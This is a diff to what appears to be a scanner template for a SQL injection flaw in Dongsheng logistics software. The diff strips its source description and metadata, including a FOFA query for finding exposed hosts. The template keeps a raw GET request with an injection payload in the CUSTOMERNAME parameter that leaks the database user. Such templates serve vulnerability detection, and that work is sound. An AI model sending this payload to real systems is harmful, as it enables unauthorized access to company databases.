@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件OPERATORCODEAdapterSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vl8si0dkomovawl1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vl8si0dkomovawl1
-    fofa: body="CompanysAdapter.aspx"
 http:
 - raw:
   - 'GET /FeeCodes/OPERATORCODEAdapter.aspx?SHOWNAME=x&rName=&CUSTOMERNAME=-1'')+1=user--+ HTTP/1.1
